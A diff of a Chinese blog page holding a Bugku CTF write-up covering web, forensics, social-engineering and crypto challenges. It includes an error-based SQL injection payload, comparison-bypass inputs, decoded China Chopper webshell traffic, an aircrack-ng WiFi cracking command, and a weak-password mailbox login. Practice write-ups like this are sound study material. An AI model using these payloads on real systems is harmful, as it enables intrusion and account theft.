-          <a href="#md5函数" class="heading-link"><i class="fas fa-link"></i></a>md5函数</h2>
-      <p>直接提交数组即可</p>
-
-        <h2 id="sha函数比较绕过">
-          <a href="#sha函数比较绕过" class="heading-link"><i class="fas fa-link"></i></a>sha函数比较绕过</h2>
-      <p>还是提交数组即可</p>
-
-        <h2 id="十六进制与数字比较">
-          <a href="#十六进制与数字比较" class="heading-link"><i class="fas fa-link"></i></a>十六进制与数字比较</h2>
-      <p>直接提交16进制数字即可。</p>
-
-        <h2 id="strpos数组绕过">
-          <a href="#strpos数组绕过" class="heading-link"><i class="fas fa-link"></i></a>strpos数组绕过</h2>
-      <p>还是数字绕过 <code>?ctf[]=1234</code></p>
-
-        <h1 id="杂项-1">
-          <a href="#杂项-1" class="heading-link"><i class="fas fa-link"></i></a>杂项</h1>
-      
-        <h2 id="眼见非实-ISCCCTF">
-          <a href="#眼见非实-ISCCCTF" class="heading-link"><i class="fas fa-link"></i></a>眼见非实(ISCCCTF)</h2>
-      <p>看到文件名是个zip，改后缀名为zip打开，解压后发现是个doc文件，但是带不开，看一下16进制发现 <code>504b0304</code>的开头，所以应该是一个zip文件，在改后缀为zip解压，找出flag即可。</p>
-
-        <h2 id="又一张图片，还单纯吗">
-          <a href="#又一张图片，还单纯吗" class="heading-link"><i class="fas fa-link"></i></a>又一张图片，还单纯吗</h2>
-      <p>binwalk跑一下发现有两个图片，切一下即可<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">falg&#123;NSCTF_e6532a34928a3d1dadd0b049d5a3cc57&#125;</span><br></pre></td></tr></table></div></figure></p>
-
-        <h2 id="宽带信息泄露">
-          <a href="#宽带信息泄露" class="heading-link"><i class="fas fa-link"></i></a>宽带信息泄露</h2>
-      <p>百度可知bin后缀为路由器备份文件，有routepassview打开找username字段即可。</p>
-
-        <h2 id="隐写2">
-          <a href="#隐写2" class="heading-link"><i class="fas fa-link"></i></a>隐写2</h2>
-      <p>binwalk跑一下即可，之后得到一个压缩包，需要密码，但是密码只有三位数，暴力破解即可密码871，然后16进制打开，在末尾即可得到flag，花括号内还要base64解码，注意吧flag的@换成a，这是一个坑。</p>
-
-        <h2 id="linux">
-          <a href="#linux" class="heading-link"><i class="fas fa-link"></i></a>linux</h2>
-      <p>直接解压，然后有个flag文件，hex里面找一下key即可。</p>
-
-        <h2 id="中国菜刀">
-          <a href="#中国菜刀" class="heading-link"><i class="fas fa-link"></i></a>中国菜刀</h2>
-      <p>下载后是个数据流文件，wireshark查看一下，由于是菜刀连接，所以只需要查看http协议即可，在第四个http协议里面发现了一句话木马，所以猜测数据传输应该在这之后，追踪一下http流，发现一段base64代码，解之<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">'5.3.0'</span>)&#123;</span><br><span class="line">	@set_magic_quotes_runtime0);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$F=<span class="string">'C:\\wwwroot\\3.php'</span>;</span><br><span class="line">$P=@fopen($F,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">echo</span>(@fread($P,filesize($F)));</span><br><span class="line">@fclose($P);;<span class="keyword">echo</span>(<span class="string">"X@Y"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></div></figure></p>
+<h2 id="urldecode二次编码饶过"><a href="#urldecode二次编码饶过" class="headerlink" title="urldecode二次编码饶过"></a>urldecode二次编码饶过</h2><p>题目关键点在于，<strong><font face="futura">$_GET[]</font></strong>会先对得到的参数进行一次url解码，然后在函数中又进行了一次解码，所以会产生二次编码漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%2568%2561%2563%256B%2565%2572%2544%254A</span><br></pre></td></tr></table></figure><br>二次编码后提交即可。</p>
+<h2 id="md5函数"><a href="#md5函数" class="headerlink" title="md5函数"></a>md5函数</h2><p>直接提交数组即可</p>
+<h2 id="sha函数比较绕过"><a href="#sha函数比较绕过" class="headerlink" title="sha函数比较绕过"></a>sha函数比较绕过</h2><p>还是提交数组即可</p>
+<h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><p>直接提交16进制数字即可。</p>
+<h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><p>还是数字绕过 <code>?ctf[]=1234</code></p>
+<h1 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h1><h2 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h2><p>看到文件名是个zip，改后缀名为zip打开，解压后发现是个doc文件，但是带不开，看一下16进制发现 <code>504b0304</code>的开头，所以应该是一个zip文件，在改后缀为zip解压，找出flag即可。</p>
+<h2 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h2><p>binwalk跑一下发现有两个图片，切一下即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">falg&#123;NSCTF_e6532a34928a3d1dadd0b049d5a3cc57&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p>百度可知bin后缀为路由器备份文件，有routepassview打开找username字段即可。</p>
+<h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>binwalk跑一下即可，之后得到一个压缩包，需要密码，但是密码只有三位数，暴力破解即可密码871，然后16进制打开，在末尾即可得到flag，花括号内还要base64解码，注意吧flag的@换成a，这是一个坑。</p>
+<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>直接解压，然后有个flag文件，hex里面找一下key即可。</p>
+<h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>下载后是个数据流文件，wireshark查看一下，由于是菜刀连接，所以只需要查看http协议即可，在第四个http协议里面发现了一句话木马，所以猜测数据传输应该在这之后，追踪一下http流，发现一段base64代码，解之<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">'5.3.0'</span>)&#123;</span><br><span class="line">	@set_magic_quotes_runtime0);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$F=<span class="string">'C:\\wwwroot\\3.php'</span>;</span><br><span class="line">$P=@fopen($F,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">echo</span>(@fread($P,filesize($F)));</span><br><span class="line">@fclose($P);;<span class="keyword">echo</span>(<span class="string">"X@Y"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></p>
 <p>这应该是打开某个文件，开头和末尾都是 <code>X@Y</code>,查看下一个http流</p>
 <p><img src="/2018/04/03/bugku-writeup%E7%BB%AD/2.png" alt></p>
 <p>这应该就是传输的文件，查看一下分组字节，然后把前后的X@Y去掉，解码为压缩形式即可得到flag</p>
-
-        <h2 id="这么多数据包">
-          <a href="#这么多数据包" class="heading-link"><i class="fas fa-link"></i></a>这么多数据包</h2>
-      <p>这个题不是很理解，数据流审计还很菜，这里记录一下别人的解法，观察tcp可以看出从104个包开始攻击机开始扫描目标机，在以5542开始的包就已经getshell，所以追踪一下tcp流，发现有个txt文件，有一段base64，解码即可得到flag、</p>
-
-        <h2 id="隐写3">
-          <a href="#隐写3" class="heading-link"><i class="fas fa-link"></i></a>隐写3</h2>
-      <p>改变图片高度即可</p>
-
-        <h2 id="想蹭网先解开密码">
-          <a href="#想蹭网先解开密码" class="heading-link"><i class="fas fa-link"></i></a>想蹭网先解开密码</h2>
-      <p>这个题不是很理解工具怎么使用，WiFi不是很了解，写一个字典出来，工具跑一下，命令如下</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wifi.cap -w passwd.txt</span><br></pre></td></tr></table></div></figure>
+<h2 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>这个题不是很理解，数据流审计还很菜，这里记录一下别人的解法，观察tcp可以看出从104个包开始攻击机开始扫描目标机，在以5542开始的包就已经getshell，所以追踪一下tcp流，发现有个txt文件，有一段base64，解码即可得到flag、</p>
+<h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>改变图片高度即可</p>
+<h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p>这个题不是很理解工具怎么使用，WiFi不是很了解，写一个字典出来，工具跑一下，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wifi.cap -w passwd.txt</span><br></pre></td></tr></table></figure>
 <p><img src="/2018/04/03/bugku-writeup%E7%BB%AD/3.png" alt></p>
-
-        <h2 id="linux2">
-          <a href="#linux2" class="heading-link"><i class="fas fa-link"></i></a>linux2</h2>
-      <p>下载文件，先是binwalk了一下，发现一个图片，还有一个图片，图片是一个flag内容，然而并不对，看了比人的wp才知道了正解，没必要binwalk直接跑一下命令即可</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings brave &gt; a.txt</span><br></pre></td></tr></table></div></figure>
+<h2 id="linux2"><a href="#linux2" class="headerlink" title="linux2"></a>linux2</h2><p>下载文件，先是binwalk了一下，发现一个图片，还有一个图片，图片是一个flag内容，然而并不对，看了比人的wp才知道了正解，没必要binwalk直接跑一下命令即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings brave &gt; a.txt</span><br></pre></td></tr></table></figure>
 <p>然后在a.txt中搜索一下 <code>key</code>，直接出现了flag</p>
-
-        <h2 id="账号被盗了-1">
-          <a href="#账号被盗了-1" class="heading-link"><i class="fas fa-link"></i></a>账号被盗了</h2>
-      <p>这题不会…</p>
-
-        <h2 id="聪明的大象">
-          <a href="#聪明的大象" class="heading-link"><i class="fas fa-link"></i></a>聪明的大象</h2>
-      <p>解压图片发现备注栏有一段base64，再看图片大小6M多，应该是加了东西，binwalk跑一下，切出来一个解压包，密码就是刚刚的base64，解之是一张图片，是以前的一道题，改变高度即可得到flag</p>
-
-        <h1 id="web进阶">
-          <a href="#web进阶" class="heading-link"><i class="fas fa-link"></i></a>web进阶</h1>
-      
-        <h2 id="实战2-注入">
-          <a href="#实战2-注入" class="heading-link"><i class="fas fa-link"></i></a>实战2-注入</h2>
-      <p>打开后发现news页面有id参数，加引号可以报错注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;18 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 21,1),0x7e),1)</span><br></pre></td></tr></table></div></figure></p>
-
-        <h2 id="Trim的日记本">
-          <a href="#Trim的日记本" class="heading-link"><i class="fas fa-link"></i></a>Trim的日记本</h2>
-      <p>扫描目录，发现有一个 <code>show.php</code>进入即可得到flag！！！！不过不知道是不是正解。</p>
-
-        <h1 id="社工">
-          <a href="#社工" class="heading-link"><i class="fas fa-link"></i></a>社工</h1>
-      
-        <h2 id="社工进阶">
-          <a href="#社工进阶" class="heading-link"><i class="fas fa-link"></i></a>社工进阶</h2>
-      <p>百度搜索孤长离发现有个贴吧，里面有个邮箱，尝试弱口令登录，百度top100弱口令，第二个就是了 <code>a123456</code></p>
-
-        <h2 id="信息查找">
-          <a href="#信息查找" class="heading-link"><i class="fas fa-link"></i></a>信息查找</h2>
-      <p>直接百度 <code>bugku.cn 今日头条</code>，第一个结果的群号即可。</p>
-
-        <h2 id="简单个人信息收集">
-          <a href="#简单个人信息收集" class="heading-link"><i class="fas fa-link"></i></a>简单个人信息收集</h2>
-      <p>首先下载到一个压缩包，发现是伪加密，破解之，然后在上社工库查询一下即可。</p>
-
-        <h2 id="简单的社工尝试">
-          <a href="#简单的社工尝试" class="heading-link"><i class="fas fa-link"></i></a>简单的社工尝试</h2>
-      <p>google识图，然后有一个github相关的页面，点进去之后有一个微博链接，进去之后有个图片，打开图片中的链接即可。</p>
-
-        <h1 id="加密">
-          <a href="#加密" class="heading-link"><i class="fas fa-link"></i></a>加密</h1>
-      
-        <h2 id="简单加密">
-          <a href="#简单加密" class="heading-link"><i class="fas fa-link"></i></a>简单加密</h2>
-      <p>凯撒移位，代码</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-70</span>,<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> cipher:</span><br><span class="line">		<span class="comment"># print(ord(j)+i)</span></span><br><span class="line">		<span class="keyword">if</span> (ord(j)+i) &gt; <span class="number">132</span> <span class="keyword">or</span> (ord(j)+i) &lt; <span class="number">33</span>:</span><br><span class="line">			<span class="keyword">break</span> </span><br><span class="line">		print(chr(ord(j)+i),end=<span class="string">""</span>)</span><br><span class="line">	print(<span class="string">'\n'</span>)</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="一段base64">
-          <a href="#一段base64" class="heading-link"><i class="fas fa-link"></i></a>一段base64</h2>
-      <p>多层解码，贴上代码:</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'base64.txt'</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="comment"># base64解码</span></span><br><span class="line">	text = file.read()</span><br><span class="line">	text = base64.b64decode(text)</span><br><span class="line">	text = text.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">	alp = re.findall(<span class="string">r'([0-7]+)'</span>,text)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># base64解码后发现像8进制，8进制转换成10进制</span></span><br><span class="line">	new_alp = []</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> alp:</span><br><span class="line">		new_alp.append(int(item,<span class="number">8</span>))</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># ascii解码	</span></span><br><span class="line">	alp = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> new_alp:</span><br><span class="line">		alp += str(chr(i))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 前面的解码后为'\xdd'的形式，推测为16进制	</span></span><br><span class="line">	plain = <span class="string">''</span></span><br><span class="line">	cipher = re.findall(<span class="string">r'\\x([0-9a-f]+)'</span>,alp)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">		plain += str(chr(int(i,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># unicode解码</span></span><br><span class="line">	cipher2 = bytes(plain,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">	plain2 = cipher2.decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># ascii解码</span></span><br><span class="line">	cipher3 = re.findall(<span class="string">r'[0-9]&#123;2,&#125;'</span>,plain2)</span><br><span class="line">	plain3 = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher3:</span><br><span class="line">		plain3 += chr(int(i))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># unicode解码</span></span><br><span class="line">	cipher4 = re.findall(<span class="string">r'#x([0-9a-f]+)'</span>,plain3)</span><br><span class="line">	plain4 = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher4:</span><br><span class="line">		plain4.append(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># ascii解码</span></span><br><span class="line">	cipher5 = plain4</span><br><span class="line">	plain5 = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher5:</span><br><span class="line">		plain5 += chr(i)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># unicode</span></span><br><span class="line">	cipher6 = re.findall(<span class="string">r'&amp;#([0-9]&#123;2,&#125;)'</span>,plain5)</span><br><span class="line">	plain6 = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher6:</span><br><span class="line">		plain6 += chr(int(i))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># urldecode</span></span><br><span class="line">	print(parse.unquote(plain6))</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="‘">
-          <a href="#‘" class="heading-link"><i class="fas fa-link"></i></a>‘!?</h2>
-      <p>看了别人的wp，这题还是Ook!语言跑一下</p>
+<h2 id="账号被盗了-1"><a href="#账号被盗了-1" class="headerlink" title="账号被盗了"></a>账号被盗了</h2><p>这题不会…</p>
+<h2 id="聪明的大象"><a href="#聪明的大象" class="headerlink" title="聪明的大象"></a>聪明的大象</h2><p>解压图片发现备注栏有一段base64，再看图片大小6M多，应该是加了东西，binwalk跑一下，切出来一个解压包，密码就是刚刚的base64，解之是一张图片，是以前的一道题，改变高度即可得到flag</p>
+<h1 id="web进阶"><a href="#web进阶" class="headerlink" title="web进阶"></a>web进阶</h1><h2 id="实战2-注入"><a href="#实战2-注入" class="headerlink" title="实战2-注入"></a>实战2-注入</h2><p>打开后发现news页面有id参数，加引号可以报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;18 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 21,1),0x7e),1)</span><br></pre></td></tr></table></figure></p>
+<h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>扫描目录，发现有一个 <code>show.php</code>进入即可得到flag！！！！不过不知道是不是正解。</p>
+<h1 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h1><h2 id="社工进阶"><a href="#社工进阶" class="headerlink" title="社工进阶"></a>社工进阶</h2><p>百度搜索孤长离发现有个贴吧，里面有个邮箱，尝试弱口令登录，百度top100弱口令，第二个就是了 <code>a123456</code></p>
+<h2 id="信息查找"><a href="#信息查找" class="headerlink" title="信息查找"></a>信息查找</h2><p>直接百度 <code>bugku.cn 今日头条</code>，第一个结果的群号即可。</p>
+<h2 id="简单个人信息收集"><a href="#简单个人信息收集" class="headerlink" title="简单个人信息收集"></a>简单个人信息收集</h2><p>首先下载到一个压缩包，发现是伪加密，破解之，然后在上社工库查询一下即可。</p>
+<h2 id="简单的社工尝试"><a href="#简单的社工尝试" class="headerlink" title="简单的社工尝试"></a>简单的社工尝试</h2><p>google识图，然后有一个github相关的页面，点进去之后有一个微博链接，进去之后有个图片，打开图片中的链接即可。</p>
+<h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><h2 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h2><p>凯撒移位，代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-70</span>,<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> cipher:</span><br><span class="line">		<span class="comment"># print(ord(j)+i)</span></span><br><span class="line">		<span class="keyword">if</span> (ord(j)+i) &gt; <span class="number">132</span> <span class="keyword">or</span> (ord(j)+i) &lt; <span class="number">33</span>:</span><br><span class="line">			<span class="keyword">break</span> </span><br><span class="line">		print(chr(ord(j)+i),end=<span class="string">""</span>)</span><br><span class="line">	print(<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="一段base64"><a href="#一段base64" class="headerlink" title="一段base64"></a>一段base64</h2><p>多层解码，贴上代码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'base64.txt'</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="comment"># base64解码</span></span><br><span class="line">	text = file.read()</span><br><span class="line">	text = base64.b64decode(text)</span><br><span class="line">	text = text.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">	alp = re.findall(<span class="string">r'([0-7]+)'</span>,text)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># base64解码后发现像8进制，8进制转换成10进制</span></span><br><span class="line">	new_alp = []</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> alp:</span><br><span class="line">		new_alp.append(int(item,<span class="number">8</span>))</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># ascii解码	</span></span><br><span class="line">	alp = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> new_alp:</span><br><span class="line">		alp += str(chr(i))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 前面的解码后为'\xdd'的形式，推测为16进制	</span></span><br><span class="line">	plain = <span class="string">''</span></span><br><span class="line">	cipher = re.findall(<span class="string">r'\\x([0-9a-f]+)'</span>,alp)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">		plain += str(chr(int(i,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># unicode解码</span></span><br><span class="line">	cipher2 = bytes(plain,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">	plain2 = cipher2.decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># ascii解码</span></span><br><span class="line">	cipher3 = re.findall(<span class="string">r'[0-9]&#123;2,&#125;'</span>,plain2)</span><br><span class="line">	plain3 = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher3:</span><br><span class="line">		plain3 += chr(int(i))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># unicode解码</span></span><br><span class="line">	cipher4 = re.findall(<span class="string">r'#x([0-9a-f]+)'</span>,plain3)</span><br><span class="line">	plain4 = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher4:</span><br><span class="line">		plain4.append(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># ascii解码</span></span><br><span class="line">	cipher5 = plain4</span><br><span class="line">	plain5 = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher5:</span><br><span class="line">		plain5 += chr(i)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># unicode</span></span><br><span class="line">	cipher6 = re.findall(<span class="string">r'&amp;#([0-9]&#123;2,&#125;)'</span>,plain5)</span><br><span class="line">	plain6 = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher6:</span><br><span class="line">		plain6 += chr(int(i))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># urldecode</span></span><br><span class="line">	print(parse.unquote(plain6))</span><br></pre></td></tr></table></figure>
+<h2 id="‘"><a href="#‘" class="headerlink" title="‘!?"></a>‘!?</h2><p>看了别人的wp，这题还是Ook!语言跑一下</p>
 <h2 id><a href="#" class="headerlink" title="+[]-"></a>+[]-</h2><p>brainfuck语言跑一下</p>
-
-        <h2 id="奇怪的密码">
-          <a href="#奇怪的密码" class="heading-link"><i class="fas fa-link"></i></a>奇怪的密码</h2>
-      <p>其实就是把flag的每一位的ascii值一次加1,2,3,..反过来解一下就可以了</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'gndk€rlqhmtkwwp&#125;z'</span></span><br><span class="line">plain = <span class="string">''</span></span><br><span class="line">seq = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">	<span class="keyword">if</span> i == <span class="string">'€'</span>:     <span class="comment"># 该字符为非法字符，不去掉的话可能会报错</span></span><br><span class="line">		seq += <span class="number">1</span></span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	plain += chr((ord(i) - seq))</span><br><span class="line">	seq += <span class="number">1</span></span><br><span class="line">print(plain)</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="托马斯杰斐逊">
